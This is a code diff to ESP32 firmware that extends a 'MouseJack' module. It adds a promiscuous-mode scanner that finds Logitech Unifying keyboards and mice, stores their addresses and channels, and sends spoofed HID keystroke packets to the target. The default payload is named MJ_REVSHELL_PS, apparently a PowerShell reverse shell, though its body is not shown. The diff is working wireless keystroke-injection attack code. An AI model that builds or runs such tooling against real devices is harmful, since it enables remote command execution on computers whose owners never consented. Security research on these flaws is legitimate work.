@@ -2578,6 +2578,80 @@ void cleanup() {
 
 
 // ═══════════════════════════════════════════════════════════════════════════
+// SHARED RAW SPI HELPERS (used by NrfSniffer and MouseJack scan)
+// Promiscuous mode requires direct register access — RF24 library bypassed
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void snWriteReg(uint8_t reg, uint8_t val) {
+    digitalWrite(NRF_CSN, LOW);
+    SPI.transfer((reg & 0x1F) | 0x20);
+    SPI.transfer(val);
+    digitalWrite(NRF_CSN, HIGH);
+}
+
+static uint8_t snReadReg(uint8_t reg) {
+    uint8_t val;
+    digitalWrite(NRF_CSN, LOW);
+    SPI.transfer(reg & 0x1F);
+    val = SPI.transfer(0);
+    digitalWrite(NRF_CSN, HIGH);
+    return val;
+}
+
+static void snWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
+    digitalWrite(NRF_CSN, LOW);
+    SPI.transfer((reg & 0x1F) | 0x20);
+    for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
+    digitalWrite(NRF_CSN, HIGH);
+}
+
+static void snFlushRx() {
+    digitalWrite(NRF_CSN, LOW);
+    SPI.transfer(0xE2);  // FLUSH_RX
+    digitalWrite(NRF_CSN, HIGH);
+}
+
+static int snReadPayload(uint8_t* buf, uint8_t len) {
+    uint8_t fifoStatus = snReadReg(0x17);  // FIFO_STATUS
+    if (fifoStatus & 0x01) return 0;       // RX FIFO empty
+
+    digitalWrite(NRF_CSN, LOW);
+    SPI.transfer(0x61);  // R_RX_PAYLOAD
+    for (uint8_t i = 0; i < len; i++) buf[i] = SPI.transfer(0);
+    digitalWrite(NRF_CSN, HIGH);
+
+    // Clear RX_DR flag
+    snWriteReg(0x07, 0x40);
+    return len;
+}
+
+static bool isNoise(const uint8_t* buf, int len) {
+    // Reject all-zero
+    bool allZero = true;
+    for (int i = 0; i < len; i++) { if (buf[i] != 0x00) { allZero = false; break; } }
+    if (allZero) return true;
+
+    // Reject all-0xFF
+    bool allFF = true;
+    for (int i = 0; i < len; i++) { if (buf[i] != 0xFF) { allFF = false; break; } }
+    if (allFF) return true;
+
+    // Reject repeated single byte (0xAA, 0x55 artifacts)
+    bool allSame = true;
+    for (int i = 1; i < len; i++) { if (buf[i] != buf[0]) { allSame = false; break; } }
+    if (allSame) return true;
+
+    // Reject if first 8 bytes are all alternating 0xAA/0x55 pattern (preamble leak)
+    int altCount = 0;
+    for (int i = 0; i < 8 && i < len; i++) {
+        if (buf[i] == 0xAA || buf[i] == 0x55) altCount++;
+    }
+    if (altCount >= 7) return true;
+
+    return false;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
 // NRF SNIFFER - Promiscuous 2.4GHz Packet Capture
 // Travis Goodspeed technique: SETUP_AW=0x00 for 2-byte illegal address width
 // Captures raw packets from wireless keyboards, mice, drones, IoT sensors
@@ -2622,77 +2696,6 @@ static unsigned long snLastDisplayUpdate = 0;
 static TaskHandle_t snTaskHandle = NULL;
 static volatile bool snTaskRunning = false;
 static volatile bool snTaskDone = false;
-
-// ── Raw SPI helpers (promiscuous mode requires direct register access) ────
-static void snWriteReg(uint8_t reg, uint8_t val) {
-    digitalWrite(NRF_CSN, LOW);
-    SPI.transfer((reg & 0x1F) | 0x20);
-    SPI.transfer(val);
-    digitalWrite(NRF_CSN, HIGH);
-}
-
-static uint8_t snReadReg(uint8_t reg) {
-    uint8_t val;
-    digitalWrite(NRF_CSN, LOW);
-    SPI.transfer(reg & 0x1F);
-    val = SPI.transfer(0);
-    digitalWrite(NRF_CSN, HIGH);
-    return val;
-}
-
-static void snWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
-    digitalWrite(NRF_CSN, LOW);
-    SPI.transfer((reg & 0x1F) | 0x20);
-    for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
-    digitalWrite(NRF_CSN, HIGH);
-}
-
-static void snFlushRx() {
-    digitalWrite(NRF_CSN, LOW);
-    SPI.transfer(0xE2);  // FLUSH_RX
-    digitalWrite(NRF_CSN, HIGH);
-}
-
-static int snReadPayload(uint8_t* buf, uint8_t len) {
-    uint8_t fifoStatus = snReadReg(0x17);  // FIFO_STATUS
-    if (fifoStatus & 0x01) return 0;       // RX FIFO empty
-
-    digitalWrite(NRF_CSN, LOW);
-    SPI.transfer(0x61);  // R_RX_PAYLOAD
-    for (uint8_t i = 0; i < len; i++) buf[i] = SPI.transfer(0);
-    digitalWrite(NRF_CSN, HIGH);
-
-    // Clear RX_DR flag
-    snWriteReg(0x07, 0x40);
-    return len;
-}
-
-// ── Noise filter ──────────────────────────────────────────────────────────
-static bool isNoise(const uint8_t* buf, int len) {
-    // Reject all-zero
-    bool allZero = true;
-    for (int i = 0; i < len; i++) { if (buf[i] != 0x00) { allZero = false; break; } }
-    if (allZero) return true;
-
-    // Reject all-0xFF
-    bool allFF = true;
-    for (int i = 0; i < len; i++) { if (buf[i] != 0xFF) { allFF = false; break; } }
-    if (allFF) return true;
-
-    // Reject repeated single byte (0xAA, 0x55 artifacts)
-    bool allSame = true;
-    for (int i = 1; i < len; i++) { if (buf[i] != buf[0]) { allSame = false; break; } }
-    if (allSame) return true;
-
-    // Reject if first 8 bytes are all alternating 0xAA/0x55 pattern (preamble leak)
-    int altCount = 0;
-    for (int i = 0; i < 8 && i < len; i++) {
-        if (buf[i] == 0xAA || buf[i] == 0x55) altCount++;
-    }
-    if (altCount >= 7) return true;
-
-    return false;
-}
 
 // ── Find or create packet entry by address ────────────────────────────────
 static int findOrCreatePacket(const uint8_t* addr, uint8_t addrLen) {
@@ -3221,6 +3224,8 @@ void loop() {
                 // Copy address to MouseJack target
                 memset(mouseJackerTarget, 0, 5);
                 memcpy(mouseJackerTarget, pkt.addr, min((int)pkt.addrLen, 5));
+                mouseJackerChannel = pkt.channel;
+                mouseJackerDeviceType = pkt.frameType;
                 waitForTouchRelease();
                 delay(200);
 
@@ -3416,6 +3421,7 @@ struct MjState {
     bool    hasTarget;
     int     selectedPayload;
     bool    injecting;
+    bool    scanning;
     int     keystrokesTotal;
     int     keystrokesSent;
     int     packetsOk;
@@ -3423,7 +3429,19 @@ struct MjState {
     char    customString[MJ_MAX_PAYLOAD_LEN];
     int     customLen;
     uint8_t targetChannel;
+    uint8_t deviceType;        // 0xC1=keyboard, 0xC2=mouse, 0x0F=HID
+    bool    testOk;            // last test keystroke result
+    unsigned long testTime;    // millis() of last test (for 1.5s flash)
 };
+
+static const char* getDeviceTypeStr(uint8_t dt) {
+    switch (dt) {
+        case 0xC1: return "KEYBOARD";
+        case 0xC2: return "MOUSE";
+        case 0x0F: return "HID DEVICE";
+        default:   return "UNKNOWN";
+    }
+}
 
 static MjState* mj = nullptr;
 static bool mjExitRequested = false;
@@ -3452,6 +3470,8 @@ static void mjTxTask(void* param) {
     }
 
     // Configure for Logitech Unifying injection
+    // Auto-ack OFF — receiver won't ACK spoofed packets from unpaired transmitter
+    // TX success = packet transmitted. Verify injection visually on target screen.
     nrf24Radio.setAutoAck(false);
     nrf24Radio.setDataRate(RF24_2MBPS);
     nrf24Radio.setCRCLength(RF24_CRC_16);
@@ -3663,13 +3683,176 @@ static void stopMjTask() {
     mjTaskHandle = NULL;
 }
 
+// ── Dual-core scan task (promiscuous mode device discovery) ───────────────
+static TaskHandle_t mjScanHandle = NULL;
+static volatile bool mjScanRunning = false;
+static volatile bool mjScanDone = false;
+static volatile int  mjScanProgress = 0;    // 0-100
+static volatile int  mjScanPass = 1;        // 1-3
+static volatile int  mjScanCh = 0;          // current channel being scanned
+static volatile bool mjScanFound = false;
+static uint8_t mjFoundAddr[5] = {0};
+static volatile uint8_t mjFoundChannel = 0;
+static volatile uint8_t mjFoundType = 0;
+
+// Logitech Unifying channels (24 frequencies)
+static const uint8_t mjLogitechCh[] = {
+    2, 5, 8, 17, 23, 26, 29, 32, 35, 38, 41, 44,
+    47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80
+};
+#define MJ_LOGI_CH_COUNT 24
+
+static void mjScanTask(void* param) {
+    // Reinit SPI on Core 0
+    SPI.end();
+    delay(5);
+    SPI.begin(18, 19, 23);
+    SPI.setFrequency(8000000);
+
+    // Configure pins
+    pinMode(NRF_CE, OUTPUT);
+    pinMode(NRF_CSN, OUTPUT);
+    digitalWrite(NRF_CE, LOW);
+    digitalWrite(NRF_CSN, HIGH);
+
+    // Deselect other SPI devices
+    #ifndef NMRF_HAT
+    pinMode(CC1101_CS, OUTPUT);
+    digitalWrite(CC1101_CS, HIGH);
+    #endif
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);
+
+    delay(10);
+
+    // Power up
+    snWriteReg(_NRF24_CONFIG, 0x02);  // PWR_UP
+    delayMicroseconds(1500);
+
+    // Promiscuous config (identical to Sniffer)
+    snWriteReg(_NRF24_SETUP_AW, 0x00);    // 2-byte illegal address width
+    snWriteReg(_NRF24_EN_AA, 0x00);        // No auto-ack
+    snWriteReg(_NRF24_EN_RXADDR, 0x03);    // Pipes 0+1
+    snWriteReg(_NRF24_RF_SETUP, 0x09);     // 2Mbps, -6dBm
+    snWriteReg(0x11, 32);                   // RX_PW_P0 = 32
+    snWriteReg(0x12, 32);                   // RX_PW_P1 = 32
+
+    const uint8_t a0[] = {0xAA, 0x55};
+    const uint8_t a1[] = {0x55, 0xAA};
+    snWriteRegMulti(_NRF24_RX_ADDR_P0, a0, 2);
+    snWriteRegMulti(_NRF24_RX_ADDR_P1, a1, 2);
+
+    snFlushRx();
+    snWriteReg(0x07, 0x70);  // Clear IRQ flags
+
+    // RX mode, CRC disabled, power up
+    snWriteReg(_NRF24_CONFIG, 0x03);
+    delayMicroseconds(1500);
+    digitalWrite(NRF_CE, HIGH);
+    delayMicroseconds(130);
+
+    #if CYD_DEBUG
+    Serial.println("[MOUSEJACK] Core 0: Scan started");
+    #endif
+
+    uint8_t rxBuf[32];
+    int totalSteps = MJ_LOGI_CH_COUNT * 3;  // 24 channels × 3 passes
+    int step = 0;
+
+    for (int pass = 1; pass <= 3 && mjScanRunning && !mjScanFound; pass++) {
+        mjScanPass = pass;
+        for (int ci = 0; ci < MJ_LOGI_CH_COUNT && mjScanRunning && !mjScanFound; ci++) {
+            uint8_t ch = mjLogitechCh[ci];
+            mjScanCh = ch;
+            step++;
+            mjScanProgress = (step * 100) / totalSteps;
+
+            // Set channel
+            snWriteReg(_NRF24_RF_CH, ch);
+            snFlushRx();
+
+            // Dwell 100ms — read FIFO repeatedly
+            unsigned long dwellEnd = millis() + 100;
+            while (millis() < dwellEnd && mjScanRunning && !mjScanFound) {
+                int n = snReadPayload(rxBuf, 32);
+                if (n == 0) {
+                    delayMicroseconds(200);
+                    continue;
+                }
+
+                if (isNoise(rxBuf, n)) continue;
+
+                // Check for HID frame types (byte 5 = frame type after 5-byte address)
+                uint8_t frameType = (n > 5) ? rxBuf[5] : 0x00;
+                if (frameType == 0xC1 || frameType == 0xC2 || frameType == 0x0F) {
+                    // Found a HID device!
+                    memcpy(mjFoundAddr, rxBuf, 5);
+                    mjFoundChannel = ch;
+                    mjFoundType = frameType;
+                    mjScanFound = true;
+                    mjScanProgress = 100;
+
+                    #if CYD_DEBUG
+                    Serial.printf("[MOUSEJACK] FOUND device: %02X:%02X:%02X:%02X:%02X ch=%d type=0x%02X\n",
+                        mjFoundAddr[0], mjFoundAddr[1], mjFoundAddr[2],
+                        mjFoundAddr[3], mjFoundAddr[4], ch, frameType);
+                    #endif
+                    break;
+                }
+            }
+
+            vTaskDelay(1);  // Yield between channels
+        }
+    }
+
+    // Cleanup — restore SETUP_AW before exit
+    digitalWrite(NRF_CE, LOW);
+    snWriteReg(_NRF24_SETUP_AW, 0x03);  // Restore 5-byte address width
+    snWriteReg(_NRF24_CONFIG, 0x00);     // Power down
+    nrf24ExitPromiscuous();
+
+    #if CYD_DEBUG
+    Serial.printf("[MOUSEJACK] Core 0: Scan done, found=%d\n", (int)mjScanFound);
+    #endif
+
+    mjScanHandle = NULL;
+    mjScanDone = true;
+    vTaskDelete(NULL);
+}
+
+static void startMjScan() {
+    if (mjScanHandle != NULL) return;
+    mjScanRunning = true;
+    mjScanDone = false;
+    mjScanFound = false;
+    mjScanProgress = 0;
+    mjScanPass = 1;
+    mjScanCh = 0;
+    mjFoundType = 0;
+    memset(mjFoundAddr, 0, 5);
+    mjFoundChannel = 0;
+    if (mj) mj->scanning = true;
+    xTaskCreatePinnedToCore(mjScanTask, "MJScan", 6144, NULL, 1, &mjScanHandle, 0);
+}
+
+static void stopMjScan() {
+    if (mjScanHandle == NULL) return;
+    mjScanRunning = false;
+    unsigned long start = millis();
+    while (!mjScanDone && millis() - start < 500) delay(10);
+    mjScanHandle = NULL;
+    if (mj) mj->scanning = false;
+}
+
 // ── Icon bar ──────────────────────────────────────────────────────────────
-#define MJ_ICON_NUM 3
-static const int mjIconX[MJ_ICON_NUM] = {SCALE_X(130), SCALE_X(170), 10};
+#define MJ_ICON_NUM 5
+static const int mjIconX[MJ_ICON_NUM] = {10, SCALE_X(50), SCALE_X(90), SCALE_X(130), SCALE_X(170)};
 static const unsigned char* const mjIcons[MJ_ICON_NUM] = {
-    bitmap_icon_start,     // Inject / Stop
-    bitmap_icon_RIGHT,     // Next payload
-    bitmap_icon_go_back    // Back
+    bitmap_icon_go_back,   // [0] Back
+    bitmap_icon_scanner,   // [1] Scan
+    bitmap_icon_key,       // [2] Test keystroke
+    bitmap_icon_start,     // [3] Inject / Stop
+    bitmap_icon_RIGHT      // [4] Next payload
 };
 
 static void drawMjIconBar() {
@@ -3679,6 +3862,52 @@ static void drawMjIconBar() {
         tft.drawBitmap(mjIconX[i], ICON_BAR_Y, mjIcons[i], 16, 16, HALEHOUND_MAGENTA);
     }
     tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
+}
+
+// ── Test key feature (send harmless right-arrow to verify injection) ─────
+static void mjTestKey() {
+    if (!mj || !mj->hasTarget || mj->scanning || mj->injecting) return;
+
+    nrf24ClaimSPI();
+    delay(10);
+
+    if (!nrf24Radio.begin()) {
+        nrf24ReleaseSPI();
+        mj->testOk = false;
+        mj->testTime = millis();
+        return;
+    }
+
+    nrf24Radio.setAutoAck(false);
+    nrf24Radio.setDataRate(RF24_2MBPS);
+    nrf24Radio.setCRCLength(RF24_CRC_16);
+    nrf24Radio.setPALevel(RF24_PA_MAX);
+    nrf24Radio.setPayloadSize(10);
+    nrf24Radio.setChannel(mj->targetChannel);
+    nrf24Radio.openWritingPipe(mj->targetAddr);
+    nrf24Radio.stopListening();
+
+    // Right-arrow key (HID 0x4F, no modifier) — harmless cursor move
+    uint8_t pkt[10] = {0x00, 0xC1, 0x00, 0x00, 0x4F, 0, 0, 0, 0, 0};
+    uint8_t lrc = 0;
+    for (int i = 0; i < 9; i++) lrc ^= pkt[i];
+    pkt[9] = lrc;
+
+    bool ok = nrf24Radio.write(pkt, 10);
+
+    // Key release
+    delay(5);
+    pkt[4] = 0;
+    lrc = 0;
+    for (int i = 0; i < 9; i++) lrc ^= pkt[i];
+    pkt[9] = lrc;
+    nrf24Radio.write(pkt, 10);
+
+    nrf24Radio.powerDown();
+    nrf24ReleaseSPI();
+
+    mj->testOk = ok;
+    mj->testTime = millis();
 }
 
 // ── Skull row ─────────────────────────────────────────────────────────────
@@ -3700,7 +3929,7 @@ static void drawMjSkulls() {
         tft.fillRect(x, MJ_SKULL_Y, 16, 16, TFT_BLACK);
 
         uint16_t color;
-        if (mj && mj->injecting) {
+        if (mj && (mj->injecting || mj->scanning)) {
             int phase = (mjSkullFrame + i) % 8;
             if (phase < 4) {
                 float ratio = phase / 3.0f;
@@ -3723,10 +3952,18 @@ static void drawMjSkulls() {
 
     int labelX = skullStartX + (MJ_SKULL_NUM * skullSpacing) + 5;
     tft.fillRect(labelX, MJ_SKULL_Y, 50, 16, TFT_BLACK);
-    tft.setTextColor((mj && mj->injecting) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    uint16_t skullLblCol = HALEHOUND_GUNMETAL;
+    const char* skullLbl = "RDY";
+    if (mj && mj->injecting) { skullLblCol = HALEHOUND_HOTPINK; skullLbl = "TX!"; }
+    else if (mj && mj->scanning) { skullLblCol = HALEHOUND_CYAN; skullLbl = "RX"; }
+    else if (mj && mj->testTime > 0 && (millis() - mj->testTime < 1500)) {
+        skullLblCol = mj->testOk ? HALEHOUND_BRIGHT : HALEHOUND_HOTPINK;
+        skullLbl = mj->testOk ? "OK" : "FAIL";
+    }
+    tft.setTextColor(skullLblCol, TFT_BLACK);
     tft.setTextSize(1);
     tft.setCursor(labelX, MJ_SKULL_Y + 4);
-    tft.print((mj && mj->injecting) ? "TX!" : "RDY");
+    tft.print(skullLbl);
 
     mjSkullFrame++;
 }
@@ -3737,7 +3974,9 @@ static void drawMjHeader() {
 
     drawGlitchText(SCALE_Y(55), "MOUSEJACK", &Nosifer_Regular10pt7b);
 
-    if (mj && mj->injecting) {
+    if (mj && mj->scanning) {
+        drawGlitchStatus(SCALE_Y(72), "SCANNING", HALEHOUND_CYAN);
+    } else if (mj && mj->injecting) {
         drawGlitchStatus(SCALE_Y(72), "INJECTING", HALEHOUND_HOTPINK);
     } else if (mj && mj->keystrokesSent > 0) {
         drawGlitchStatus(SCALE_Y(72), "COMPLETE", HALEHOUND_BRIGHT);
@@ -3748,73 +3987,154 @@ static void drawMjHeader() {
     tft.drawLine(0, SCALE_Y(82), SCREEN_WIDTH, SCALE_Y(82), HALEHOUND_HOTPINK);
 }
 
-// ── Draw main content ────────────────────────────────────────────────────
-static void drawMjContent() {
-    int y = SCALE_Y(86);
+// ── Draw target frame only ───────────────────────────────────────────────
+static void drawMjTargetFrame() {
+    int frameY = SCALE_Y(86);
+    int frameH = SCALE_H(55);
 
-    // Clear content area (below header, above skulls)
-    tft.fillRect(0, y, SCREEN_WIDTH, MJ_SKULL_Y - y - 4, TFT_BLACK);
+    // Clear inside frame only (avoid redrawing borders when not needed)
+    tft.fillRect(12, frameY + 2, CONTENT_INNER_W - 4, frameH - 4, TFT_BLACK);
 
-    // Target frame
-    int frameY = y;
-    int frameH = SCALE_H(38);
+    // Borders
     tft.drawRoundRect(10, frameY, CONTENT_INNER_W, frameH, 6, HALEHOUND_VIOLET);
     tft.drawRoundRect(11, frameY + 1, CONTENT_INNER_W - 2, frameH - 2, 5, HALEHOUND_GUNMETAL);
 
-    tft.setTextSize(1);
-    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
-    tft.setCursor(18, frameY + 6);
-    tft.print("TARGET: ");
     if (mj->hasTarget) {
+        // Device type with flanking skulls — size 2, centered
+        const char* devStr = getDeviceTypeStr(mj->deviceType);
+        int devLen = strlen(devStr);
+        int devPixW = devLen * 12;  // size 2 = 12px per char
+        int devX = (SCREEN_WIDTH - devPixW) / 2;
+        tft.drawBitmap(devX - 20, frameY + 6, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_BRIGHT);
+        tft.setTextSize(2);
         tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+        tft.setCursor(devX, frameY + 6);
+        tft.print(devStr);
+        tft.drawBitmap(devX + devPixW + 4, frameY + 6, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_BRIGHT);
+
+        // Address + Channel
+        tft.setTextSize(1);
+        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+        tft.setCursor(18, frameY + 26);
         tft.printf("%02X:%02X:%02X:%02X:%02X",
             mj->targetAddr[0], mj->targetAddr[1], mj->targetAddr[2],
             mj->targetAddr[3], mj->targetAddr[4]);
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.setCursor(SCALE_X(130), frameY + 26);
+        tft.printf("CH:%d", mj->targetChannel);
+
+        // Test result — third line (flashes for 1.5s after test)
+        if (mj->testTime > 0) {
+            tft.setCursor(18, frameY + 40);
+            if (millis() - mj->testTime < 1500) {
+                if (mj->testOk) {
+                    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+                    tft.print("TEST: OK  ");
+                } else {
+                    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+                    tft.print("TEST: FAIL");
+                }
+            } else {
+                tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+                tft.printf("TEST: %s%s", mj->testOk ? "OK" : "FAIL", mj->testOk ? "  " : "");
+            }
+        }
     } else {
+        tft.setTextSize(2);
         tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-        tft.print("NOT SET");
+        int noTgtX = (SCREEN_WIDTH - (9 * 12)) / 2;
+        tft.setCursor(noTgtX, frameY + 10);
+        tft.print("NO TARGET");
+        tft.setTextSize(1);
+        int hintX = (SCREEN_WIDTH - (15 * 6)) / 2;
+        tft.setCursor(hintX, frameY + 32);
+        tft.print("(tap Scan icon)");
+    }
+}
+
+// ── Draw action button only ──────────────────────────────────────────────
+static void drawMjActionBtn() {
+    int btnY = SCALE_Y(148);
+    int btnH = SCALE_H(34);
+    int btnX = 10;
+    int btnW = CONTENT_INNER_W;
+
+    uint16_t btnBorder, btnTextCol;
+    const char* btnText;
+    bool showSkulls = false;
+
+    if (mj->injecting) {
+        btnBorder = HALEHOUND_HOTPINK;
+        btnTextCol = HALEHOUND_HOTPINK;
+        btnText = "STOP INJECT";
+        showSkulls = true;
+    } else if (mj->scanning) {
+        btnBorder = HALEHOUND_GUNMETAL;
+        btnTextCol = HALEHOUND_GUNMETAL;
+        btnText = "SCANNING...";
+    } else if (!mj->hasTarget) {
+        btnBorder = HALEHOUND_GUNMETAL;
+        btnTextCol = HALEHOUND_GUNMETAL;
+        btnText = "NO TARGET";
+    } else {
+        btnBorder = HALEHOUND_MAGENTA;
+        btnTextCol = HALEHOUND_MAGENTA;
+        btnText = "START INJECT";
+        showSkulls = true;
     }
 
-    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
-    tft.setCursor(18, frameY + 20);
-    tft.printf("CH: %d", mj->targetChannel);
-    if (!mj->hasTarget) {
-        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-        tft.setCursor(SCALE_X(80), frameY + 20);
-        tft.print("(use Sniffer first)");
+    tft.fillRoundRect(btnX, btnY, btnW, btnH, 5, HALEHOUND_DARK);
+    tft.drawRoundRect(btnX, btnY, btnW, btnH, 5, btnBorder);
+    tft.drawRoundRect(btnX + 1, btnY + 1, btnW - 2, btnH - 2, 4, btnBorder);
+
+    if (showSkulls) {
+        tft.drawBitmap(btnX + 6, btnY + 9, bitmap_icon_skull_wifi, 16, 16, btnBorder);
+        tft.drawBitmap(btnX + btnW - 22, btnY + 9, bitmap_icon_skull_wifi, 16, 16, btnBorder);
     }
 
-    y = frameY + frameH + 4;
-    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
-    y += 4;
+    tft.setTextSize(2);
+    tft.setTextColor(btnTextCol);
+    int txtLen = strlen(btnText);
+    int txtPixW = txtLen * 12;
+    int txtX = btnX + (btnW - txtPixW) / 2;
+    tft.setCursor(txtX, btnY + 9);
+    tft.print(btnText);
+    tft.setTextSize(1);
+}
 
-    // Payload label
+// ── Draw payload selector line only ──────────────────────────────────────
+static void drawMjPayloadLine() {
+    int y = SCALE_Y(188);
+    // Clear the line (payload names vary in length)
+    tft.fillRect(10, y, SCREEN_WIDTH - 20, 10, TFT_BLACK);
     tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
     tft.setCursor(10, y);
-    tft.print("PAYLOAD:");
-    y += 12;
+    tft.print("PAYLOAD: ");
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    tft.print("\x10 ");
+    tft.print(MJ_PAYLOAD_NAMES[mj->selectedPayload]);
+}
 
-    // Payload list
-    for (int i = 0; i < MJ_PAYLOAD_COUNT; i++) {
-        tft.setCursor(18, y);
-        if (i == mj->selectedPayload) {
-            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
-            tft.print("\x10 ");  // Right-pointing triangle
-        } else {
-            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-            tft.print("  ");
+// ── Draw status area only (progress bars + stats) ────────────────────────
+static void drawMjStatus() {
+    int y = SCALE_Y(204);
+    // Clear status area only (between payload line and skulls)
+    tft.fillRect(0, y, SCREEN_WIDTH, MJ_SKULL_Y - y - 4, TFT_BLACK);
+
+    if (mj->scanning) {
+        int barX = 10;
+        int barW = SCREEN_WIDTH - 20;
+        int barH = SCALE_H(16);
+        tft.drawRoundRect(barX, y, barW, barH, 3, HALEHOUND_CYAN);
+        int progress = (mjScanProgress * (barW - 4)) / 100;
+        if (progress > 0) {
+            tft.fillRoundRect(barX + 2, y + 2, progress, barH - 4, 2, HALEHOUND_CYAN);
         }
-        tft.print(MJ_PAYLOAD_NAMES[i]);
-        y += 11;
-    }
-
-    y += 3;
-    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
-    y += 5;
-
-    // Injection status / progress
-    if (mj->injecting) {
-        // Progress bar with rounded rect
+        y += barH + 4;
+        tft.setTextColor(HALEHOUND_CYAN, TFT_BLACK);
+        tft.setCursor(10, y);
+        tft.printf("PASS %d/3  CH:%d  [%d%%]", (int)mjScanPass, (int)mjScanCh, (int)mjScanProgress);
+    } else if (mj->injecting) {
         int barX = 10;
         int barW = SCREEN_WIDTH - 20;
         int barH = SCALE_H(16);
@@ -3827,10 +4147,9 @@ static void drawMjContent() {
             tft.fillRoundRect(barX + 2, y + 2, progress, barH - 4, 2, HALEHOUND_HOTPINK);
         }
         y += barH + 4;
-
         tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
         tft.setCursor(10, y);
-        tft.printf("TX:%d/%d  OK:%d FAIL:%d",
+        tft.printf("TX:%d/%d  OK:%d  FAIL:%d",
             mj->keystrokesSent, mj->keystrokesTotal, mj->packetsOk, mj->packetsFail);
     } else if (mj->keystrokesSent > 0) {
         tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
@@ -3839,15 +4158,27 @@ static void drawMjContent() {
         y += 12;
         tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
         tft.setCursor(10, y);
-        tft.printf("TX:%d  OK:%d FAIL:%d",
+        tft.printf("TX:%d  OK:%d  FAIL:%d",
             mj->keystrokesSent, mj->packetsOk, mj->packetsFail);
     } else {
-        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.print(mj->hasTarget ? "READY" : "SET TARGET FIRST");
+        if (mj->hasTarget) {
+            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+            tft.setCursor(10, y);
+            tft.print("READY");
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+            tft.setCursor(10, y);
+            tft.print("SCAN FOR TARGET");
+        }
     }
+}
 
-    // Skull row
+// ── Draw all content (called on state changes only) ──────────────────────
+static void drawMjContent() {
+    drawMjTargetFrame();
+    drawMjActionBtn();
+    drawMjPayloadLine();
+    drawMjStatus();
     drawMjSkulls();
 }
 
@@ -3875,7 +4206,16 @@ void setup() {
         mj->hasTarget = true;
     }
     mj->selectedPayload = MJ_REVSHELL_PS;
-    mj->targetChannel = 2;  // Default Logitech channel
+    mj->targetChannel = (mouseJackerChannel > 0) ? mouseJackerChannel : 2;
+    mj->deviceType = mouseJackerDeviceType;
+    mj->testTime = 0;
+
+    // Init scan state
+    mjScanHandle = NULL;
+    mjScanRunning = false;
+    mjScanDone = false;
+    mjScanFound = false;
+    mjScanProgress = 0;
 
     tft.fillScreen(HALEHOUND_BLACK);
     drawStatusBar();
@@ -3903,31 +4243,77 @@ void loop() {
 
     touchButtonsUpdate();
 
+    // Check if scan completed with a found device
+    if (mjScanDone && mj->scanning) {
+        mj->scanning = false;
+        if (mjScanFound) {
+            memcpy(mj->targetAddr, mjFoundAddr, 5);
+            memcpy(mouseJackerTarget, mjFoundAddr, 5);
+            mj->targetChannel = mjFoundChannel;
+            mouseJackerChannel = mjFoundChannel;
+            mj->deviceType = mjFoundType;
+            mouseJackerDeviceType = mjFoundType;
+            mj->hasTarget = true;
+        }
+        drawMjHeader();
+        drawMjContent();
+    }
+
     uint16_t tx, ty;
     if (getTouchPoint(&tx, &ty)) {
         if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
-            // Back
+            // [0] Back (x < 40)
             if (tx < 40) {
+                if (mj->scanning) stopMjScan();
                 if (mj->injecting) stopMjTask();
                 mjExitRequested = true;
                 return;
             }
-            // Inject / Stop
-            if (tx >= mjIconX[0] - 10 && tx < mjIconX[0] + 25) {
+            // [1] Scan (mjIconX[1] area)
+            if (tx >= mjIconX[1] - 10 && tx < mjIconX[1] + 25) {
+                waitForTouchRelease();
+                delay(200);
+                if (mj->scanning) {
+                    stopMjScan();
+                } else if (!mj->injecting) {
+                    // Clear old target before scanning
+                    memset(mj->targetAddr, 0, 5);
+                    mj->hasTarget = false;
+                    mj->deviceType = 0;
+                    mj->testTime = 0;
+                    mj->keystrokesSent = 0;
+                    mj->packetsOk = 0;
+                    mj->packetsFail = 0;
+                    startMjScan();
+                }
+                drawMjHeader();
+                drawMjContent();
+                return;
+            }
+            // [2] Test keystroke (mjIconX[2] area)
+            if (tx >= mjIconX[2] - 10 && tx < mjIconX[2] + 25) {
+                waitForTouchRelease();
+                delay(200);
+                mjTestKey();
+                drawMjContent();
+                return;
+            }
+            // [3] Inject / Stop (mjIconX[3] area)
+            if (tx >= mjIconX[3] - 10 && tx < mjIconX[3] + 25) {
                 waitForTouchRelease();
                 delay(200);
